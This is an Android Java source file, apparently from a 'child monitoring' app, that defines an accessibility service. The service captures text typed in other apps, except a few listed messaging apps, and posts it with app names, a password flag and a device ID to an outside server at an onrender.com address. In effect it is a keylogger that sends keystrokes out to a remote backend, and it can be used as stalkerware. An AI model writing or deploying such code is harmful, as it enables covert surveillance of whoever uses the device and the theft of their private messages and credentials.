package com.monitoring.child;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import org.json.JSONObject;

import java.util.List;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MyTextCaptureService extends AccessibilityService {

    private static final String TAG = "TextCaptureService";
    
    // List of apps to ignore
    private static final Set<String> IGNORED_PACKAGES = new HashSet<>(Arrays.asList(
            "com.facebook.katana",   // Facebook
            "com.facebook.orca",     // Messenger
            "com.facebook.mlite",    // Messenger Lite
            "com.whatsapp",          // WhatsApp
            "com.whatsapp.w4b",      // WhatsApp Business
            "com.snapchat.android"   // Snapchat
    ));

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String packageName = event.getPackageName() != null
                    ? event.getPackageName().toString()
                    : "unknown";

            // 1. Avoid capturing from certain apps
            if (IGNORED_PACKAGES.contains(packageName)) {
                return;
            }

            List<CharSequence> texts = event.getText();
            if (texts != null && !texts.isEmpty()) {
                String typedText = texts.get(0).toString().trim();

                // 2. Password text handling
                // Note: Android usually masks password fields for security.
                // If it's a password field, event.isPassword() will be true.
                boolean isPassword = event.isPassword();

                if (typedText.length() > 2 || isPassword) {
                    Log.d(TAG, "Typed: " + (isPassword ? "[PASSWORD]" : typedText) + " | App: " + packageName);
                    sendToBackend(typedText, packageName, isPassword);
                }
            }
        }
    }

    private void sendToBackend(String text, String packageName, boolean isPassword) {
        new Thread(() -> {
            try {
                String url = UrlHelper.getApiUrl("screenmonitoring-6hn7.onrender.com", "/api/typed-text");

                JSONObject json = new JSONObject();
                json.put("device_id", getStoredDeviceId());
                json.put("text", text);
                json.put("app_package", packageName);
                json.put("is_password", isPassword);
                json.put("timestamp", System.currentTimeMillis());

                RequestBody body = RequestBody.create(
                        json.toString(),
                        MediaType.parse("application/json; charset=utf-8")
                );

                Request request = new Request.Builder()
                        .url(url)
                        .post(body)
                        .build();

                // আপনার httpClient ব্যবহার করতে চাইলে static করে নিন অথবা নতুন OkHttpClient ব্যবহার করুন
                new okhttp3.OkHttpClient().newCall(request).enqueue(new okhttp3.Callback() {
                    @Override
                    public void onFailure(okhttp3.Call call, java.io.IOException e) {
                        Log.e(TAG, "Failed to send text", e);
                    }
                    @Override
                    public void onResponse(okhttp3.Call call, okhttp3.Response response) {
                        response.close();
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Error sending to backend", e);
            }
        }).start();
    }

    private String getStoredDeviceId() {
        android.content.SharedPreferences prefs = getSharedPreferences("monitoring_prefs", MODE_PRIVATE);
        return prefs.getString("device_id", "UNKNOWN");
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Text Capture Accessibility Service Connected");
    }
}